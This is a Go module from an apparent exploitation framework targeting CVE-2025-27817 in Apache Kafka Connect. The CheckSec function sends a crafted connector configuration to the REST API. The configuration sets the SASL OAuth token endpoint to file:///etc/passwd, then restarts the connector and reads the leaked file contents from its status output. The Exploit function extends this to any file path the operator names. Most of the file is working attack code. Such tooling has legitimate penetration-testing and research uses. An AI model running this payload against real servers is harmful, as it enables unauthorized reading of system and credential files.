package cve_2025_27817

import (
	"appsploit/cmd/appsploit/flags"
	"appsploit/pkg/utils"
	"fmt"
	"strings"
	"time"

	"github.com/ctrsploit/sploit-spec/pkg/app"
	"github.com/ctrsploit/sploit-spec/pkg/exeenv"
	"github.com/ctrsploit/sploit-spec/pkg/vul"

	"github.com/urfave/cli/v2"
)

var (
	aliases     = []string{"cve_2025_27817"}
	VulCmd      = app.Vul2VulCmd(&Vul, aliases, nil, nil, true)
	CheckSecCmd = app.Vul2ChecksecCmd(&Vul, aliases, flags.SubCmdFlags)
	ExploitCmd  = app.Vul2ExploitCmd(&Vul, aliases, flags.SubCmdFlags, true)
)

type vulnerability struct {
	vul.BaseVulnerability
}

var Vul = vulnerability{
	BaseVulnerability: vul.BaseVulnerability{
		Name:        "CVE-2025-27817",
		Description: "Apache Kafka Connect Arbitrary File Read - Type: Arbitrary File Read/SSRF",
		Level:       vul.LevelHigh,
		ExeEnv: exeenv.ExeEnv{
			Env:     exeenv.Remote,
			Check:   exeenv.Remote,
			Exploit: exeenv.Remote,
		},
		CheckSecPrerequisites:    nil,
		ExploitablePrerequisites: nil,
	},
}

func (v *vulnerability) CheckSec(context *cli.Context) (vulnerabilityExists bool, err error) {
	baseURL := utils.Http.FormatURL(context)

	// 获取 Kafka broker 地址，默认为 kafka:9092
	// 使用通用参数：--custom-data broker=kafka:9092
	kafkaBroker := utils.Common.GetCustomValue(context, "broker", "kafka:9092")

	// 生成随机连接器名称
	connectorName := fmt.Sprintf("test-connector-%d", time.Now().Unix())

	// 创建恶意连接器配置
	config := fmt.Sprintf(`{
		"name": "%s",
		"config": {
			"connector.class": "org.apache.kafka.connect.mirror.MirrorHeartbeatConnector",
			"heartbeats.topic.replication.factor": "1",
			"replication.factor": "1",
			"source.cluster.alias": "source",
			"target.cluster.alias": "target",
			"source.cluster.bootstrap.servers": "%s",
			"target.cluster.bootstrap.servers": "%s",
			"topics": ".*",
			"groups": ".*",
			"sync.group.offsets.enabled": "true",
			"emit.heartbeats.enabled": "true",
			"producer.override.sasl.mechanism": "OAUTHBEARER",
			"producer.override.security.protocol": "SASL_PLAINTEXT",
			"producer.override.sasl.oauthbearer.token.endpoint.url": "file:///etc/passwd",
			"producer.override.sasl.jaas.config": "org.apache.kafka.common.security.oauthbearer.OAuthBearerLoginModule required;",
			"producer.override.sasl.login.callback.handler.class": "org.apache.kafka.common.security.oauthbearer.secured.OAuthBearerLoginCallbackHandler"
		}
	}`, connectorName, kafkaBroker, kafkaBroker)

	httpClient := *utils.Http.Client()
	httpClient.SetHeader("Content-Type", "application/json")

	// 1. 创建连接器
	if _, err := httpClient.SetBody(config).Post(baseURL + "/connectors"); err != nil {
		return false, err
	}

	// 等待连接器创建
	time.Sleep(2 * time.Second)

	// 2. 重启连接器
	if _, err := httpClient.Post(baseURL + "/connectors/" + connectorName + "/restart"); err != nil {
		// 清理连接器
		httpClient.Delete(baseURL + "/connectors/" + connectorName)
		return false, err
	}

	// 等待连接器重启
	time.Sleep(5 * time.Second)

	// 3. 检查状态
	if resp, err := httpClient.Get(baseURL + "/connectors/" + connectorName + "/status"); err != nil {
		// 清理连接器
		httpClient.Delete(baseURL + "/connectors/" + connectorName)
		return false, err
	} else {
		respBody := resp.String()
		// 检查是否包含 /etc/passwd 的内容特征
		if strings.Contains(respBody, "root:x") || strings.Contains(respBody, "sbin") {
			v.VulnerabilityExists = true
		} else {
			v.VulnerabilityExists = false
		}

		// 清理连接器
		httpClient.Delete(baseURL + "/connectors/" + connectorName)
	}

	return v.BaseVulnerability.CheckSec(context)
}

func (v *vulnerability) Exploit(context *cli.Context) error {
	baseURL := utils.Http.FormatURL(context)
	filename := context.String("file")
	if filename == "" {
		filename = "/etc/passwd"
	}

	// 确保文件路径以 / 开头
	if !strings.HasPrefix(filename, "/") {
		filename = "/" + filename
	}

	// 获取 Kafka broker 地址
	// 使用通用参数：--custom-data broker=kafka:9092
	kafkaBroker := utils.Common.GetCustomValue(context, "broker", "kafka:9092")

	if vulnerabilityExists, err := v.CheckSec(context); err != nil {
		return err
	} else {
		if vulnerabilityExists {
			if resp, err := Exploit(baseURL, kafkaBroker, filename); err != nil {
				return err
			} else {
				v.VulnerabilityResponse = resp
				// 调用基类的输出方法来显示结果
				v.BaseVulnerability.OutputResp()
				return nil
			}
		}
	}
	return nil
}
